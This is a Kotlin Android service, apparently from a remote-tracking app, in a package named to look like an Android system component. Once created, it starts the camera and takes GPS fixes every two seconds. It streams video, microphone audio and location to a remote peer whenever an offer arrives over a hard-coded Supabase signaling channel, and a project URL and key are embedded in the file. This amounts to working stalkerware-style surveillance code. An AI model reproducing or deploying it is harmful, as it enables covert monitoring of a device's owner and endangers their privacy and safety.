package com.android.system.core

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import io.github.jan.supabase.SupabaseClient
import io.github.jan.supabase.createSupabaseClient
import io.github.jan.supabase.realtime.Realtime
import io.github.jan.supabase.realtime.RealtimeChannel
import io.github.jan.supabase.realtime.channel
import io.github.jan.supabase.realtime.realtime
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.webrtc.*
import java.nio.ByteBuffer
import kotlinx.serialization.json.*
import io.github.jan.supabase.realtime.broadcastFlow
import android.content.Context
import com.google.android.gms.location.*
import com.google.android.gms.location.Priority
import android.os.Looper
import android.Manifest
import android.content.pm.PackageManager
import androidx.core.content.ContextCompat
import kotlinx.coroutines.channels.Channel
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.pm.ServiceInfo
import android.os.Build
import androidx.core.app.NotificationCompat
import android.app.PendingIntent

class TrackerService : Service() {

    private lateinit var peerConnectionFactory: PeerConnectionFactory
    private var peerConnection: PeerConnection? = null
    private var eglBase: EglBase? = null
    
    private val iceCandidateQueue = Channel<JsonObject>(Channel.UNLIMITED)
    
    private lateinit var supabase: SupabaseClient
    private lateinit var channel: RealtimeChannel
    private val scope = CoroutineScope(Dispatchers.Main)
    
    private var dataChannel: DataChannel? = null
    
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback
    
    private var videoSource: VideoSource? = null
    private var videoCapturer: VideoCapturer? = null

    override fun onCreate() {
        super.onCreate()
        
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        
        initWebRTC()
        initSupabase()
        
        startLocationUpdates()
    }
    
    private fun startLocationUpdates() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return
        }
        val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 2000L).build()
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                result.lastLocation?.let { loc ->
                    dataChannel?.let { dc ->
                        if (dc.state() == DataChannel.State.OPEN) {
                            val msg = "Lat: ${loc.latitude}, Lon: ${loc.longitude}"
                            val buffer = ByteBuffer.wrap(msg.toByteArray())
                            dc.send(DataChannel.Buffer(buffer, false))
                        }
                    }
                }
            }
        }
        fusedLocationClient.requestLocationUpdates(request, locationCallback, Looper.getMainLooper())
    }

    private fun initWebRTC() {
        eglBase = EglBase.create()
        PeerConnectionFactory.initialize(
            PeerConnectionFactory.InitializationOptions.builder(this)
                .setEnableInternalTracer(true)
                .createInitializationOptions()
        )

        val options = PeerConnectionFactory.Options()
        peerConnectionFactory = PeerConnectionFactory.builder()
            .setOptions(options)
            .setVideoDecoderFactory(DefaultVideoDecoderFactory(eglBase!!.eglBaseContext))
            .setVideoEncoderFactory(DefaultVideoEncoderFactory(eglBase!!.eglBaseContext, true, true))
            .createPeerConnectionFactory()
            
        // Setup Video (Capturer is created once)
        videoCapturer = createCameraCapturer(Camera1Enumerator(false))
        videoSource = peerConnectionFactory.createVideoSource(videoCapturer?.isScreencast ?: false)
        val surfaceTextureHelper = SurfaceTextureHelper.create("CaptureThread", eglBase!!.eglBaseContext)
        videoCapturer?.initialize(surfaceTextureHelper, this, videoSource?.capturerObserver)
        videoCapturer?.startCapture(1024, 720, 30)
    }
    
    private fun createCameraCapturer(enumerator: CameraEnumerator): VideoCapturer? {
        val deviceNames = enumerator.deviceNames
        for (deviceName in deviceNames) {
            if (enumerator.isBackFacing(deviceName)) {
                val videoCapturer: VideoCapturer? = enumerator.createCapturer(deviceName, null)
                if (videoCapturer != null) return videoCapturer
            }
        }
        for (deviceName in deviceNames) {
            if (enumerator.isFrontFacing(deviceName)) {
                val videoCapturer: VideoCapturer? = enumerator.createCapturer(deviceName, null)
                if (videoCapturer != null) return videoCapturer
            }
        }
        return null
    }

    private fun createPeerConnection() {
        val iceServers = listOf(
            PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer()
        )
        val rtcConfig = PeerConnection.RTCConfiguration(iceServers)
        
        val observer = object : PeerConnection.Observer {
            override fun onSignalingChange(p0: PeerConnection.SignalingState?) {}
            override fun onIceConnectionChange(p0: PeerConnection.IceConnectionState?) {}
            override fun onIceConnectionReceivingChange(p0: Boolean) {}
            override fun onIceGatheringChange(p0: PeerConnection.IceGatheringState?) {}
            override fun onIceCandidate(candidate: IceCandidate?) {
                candidate?.let {
                    val json = buildJsonObject {
                        put("type", "candidate")
                        put("sdpMid", it.sdpMid)
                        put("sdpMLineIndex", it.sdpMLineIndex)
                        put("sdp", it.sdp)
                    }
                    iceCandidateQueue.trySend(json)
                }
            }
            override fun onIceCandidatesRemoved(p0: Array<out IceCandidate>?) {}
            override fun onAddStream(stream: MediaStream?) {}
            override fun onRemoveStream(p0: MediaStream?) {}
            override fun onDataChannel(dc: DataChannel?) {
                dataChannel = dc
            }
            override fun onRenegotiationNeeded() {}
            override fun onAddTrack(receiver: RtpReceiver?, streams: Array<out MediaStream>?) {}
        }
        peerConnection = peerConnectionFactory.createPeerConnection(rtcConfig, observer)
    }

    private fun initSupabase() {
        supabase = createSupabaseClient(
            supabaseUrl = "https://jyiqhqxjoahlxflaated.supabase.co",
            supabaseKey = "sb_publishable_V8sEexRIUmlAqTO37ygDbQ_1rw7Z5PN"
        ) {
            install(Realtime)
        }

        scope.launch {
            supabase.realtime.connect()
            channel = supabase.realtime.channel("webrtc-signaling")
            channel.subscribe()

            launch {
                channel.broadcastFlow<JsonObject>("offer").collect { offer ->
                    Log.d("WebRTC", "Received offer, resetting peer connection")
                    
                    peerConnection?.close()
                    createPeerConnection()
                    
                    val videoTrack = peerConnectionFactory.createVideoTrack("100", videoSource)
                    val audioSource = peerConnectionFactory.createAudioSource(MediaConstraints())
                    val audioTrack = peerConnectionFactory.createAudioTrack("101", audioSource)
                    peerConnection?.addTrack(videoTrack, listOf("mediaStream"))
                    peerConnection?.addTrack(audioTrack, listOf("mediaStream"))

                    val sdp = SessionDescription(SessionDescription.Type.OFFER, offer["sdp"]!!.jsonPrimitive.content)
                    peerConnection?.setRemoteDescription(SimpleSdpObserver(), sdp)
                    
                    val constraints = MediaConstraints()
                    peerConnection?.createAnswer(object : SimpleSdpObserver() {
                        override fun onCreateSuccess(desc: SessionDescription?) {
                            desc?.let {
                                peerConnection?.setLocalDescription(SimpleSdpObserver(), it)
                                scope.launch(Dispatchers.IO) {
                                    val json = buildJsonObject {
                                        put("type", "answer")
                                        put("sdp", it.description)
                                    }
                                        var success = false
                                        var attempts = 0
                                        while (!success && attempts < 5) {
                                            try {
                                                channel.broadcast("answer", json)
                                                success = true
                                            } catch (e: Exception) {
                                                attempts++
                                                Log.e("WebRTC", "Failed to broadcast answer, retrying...", e)
                                                kotlinx.coroutines.delay(250)
                                            }
                                        }
                                }
                            }
                        }
                    }, constraints)
                }
            }
            
            launch {
                channel.broadcastFlow<JsonObject>("ice").collect { candidateJson ->
                    if (!candidateJson.containsKey("sdpMid")) return@collect
                    val candidate = IceCandidate(
                        candidateJson["sdpMid"]!!.jsonPrimitive.content,
                        candidateJson["sdpMLineIndex"]!!.jsonPrimitive.int,
                        candidateJson["sdp"]!!.jsonPrimitive.content
                    )
                    peerConnection?.addIceCandidate(candidate)
                }
            }

            launch(Dispatchers.IO) {
                for (json in iceCandidateQueue) {
                    try {
                        channel.broadcast("ice", json)
                        kotlinx.coroutines.delay(120) // ~8 messages per second to respect the 10 msg/sec limit
                    } catch (e: Exception) {}
                }
            }
        }
    }

    open class SimpleSdpObserver : SdpObserver {
        override fun onCreateSuccess(p0: SessionDescription?) {}
        override fun onSetSuccess() {}
        override fun onCreateFailure(p0: String?) {}
        override fun onSetFailure(p0: String?) {}
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotificationChannel()
        updateForegroundNotification()
        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "TrackerChannel",
                "Live Tracker Service",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun updateForegroundNotification() {
        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
        }
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val notification = NotificationCompat.Builder(this, "TrackerChannel")
            .setContentTitle("Live Tracker Active")
            .setContentText("Tracking location, screen, and audio in background.")
            .setSmallIcon(android.R.drawable.ic_menu_preferences)
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build()

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                var type = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                // No MEDIA_PROJECTION for now as WebRTC only captures camera
                startForeground(1, notification, type)
            } else {
                startForeground(1, notification)
            }
        } catch (e: Exception) {
            Log.e("TrackerService", "Failed to start foreground service", e)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        super.onDestroy()
        videoCapturer?.stopCapture()
        peerConnection?.close()
        fusedLocationClient.removeLocationUpdates(locationCallback)
    }
}
